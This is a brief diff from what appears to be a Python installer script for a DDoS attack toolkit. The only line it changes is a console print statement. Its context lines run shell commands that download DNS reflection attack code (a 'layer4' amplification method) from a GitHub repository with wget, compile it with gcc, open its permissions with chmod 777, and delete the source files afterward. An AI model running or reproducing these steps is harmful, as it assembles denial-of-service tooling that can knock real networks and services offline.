@@ -17,4 +17,4 @@ Azula("cd IPHM/ && wget -q https://raw.githubusercontent.com/necrophilic/Exclusi
 Azula("cd IPHM/ && wget -q https://raw.githubusercontent.com/necrophilic/Exclusion/main/AMP/methods/layer4/v1/reflection/dns/dns.c -O dns.c; gcc -o dns -w dns.c -pthread; cd")
 Azula("cd IPHM/ && chmod 777 * && cd")
 Azula("cd IPHM/ && rm -rf ldap.c ssdp.c wsd.c mssql.c dns.c && cd")
-print(""+ white +"["+ yellow +"Console"+ white +"] - ["+ blue +"Event"+ white +"] - ["+green+"IPSP"white"/"+ cyan +"All Scripts Downloaded"+ white +"]\n")
+print(""+ white +"["+ yellow +"Console"+ white +"] - ["+ blue +"Event"+ white +"] - ["+green+"IPSP"white"/"+ cyan +"All Scripts Downloaded"+ white +"]")
